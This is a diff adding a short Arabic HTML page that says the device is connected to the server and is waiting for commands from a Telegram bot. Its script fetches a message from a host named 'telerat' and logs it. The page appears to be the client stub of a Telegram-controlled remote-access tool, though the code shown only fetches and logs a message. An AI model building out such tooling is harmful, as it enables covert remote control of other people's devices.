@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>اتصال الجهاز بالخادم</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; background-color: #222; color: white; }
+        .container { max-width: 400px; margin: auto; padding: 20px; background-color: #333; border-radius: 10px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>✅ الجهاز متصل بالخادم</h2>
+        <p>انتظر الأوامر من بوت تيليجرام...</p>
+    </div>
+
+    <script>
+        fetch("https://telerat-od9z.onrender.com")
+            .then(response => response.json())
+            .then(data => console.log(data.message));
+    </script>
+</body>
+</html>
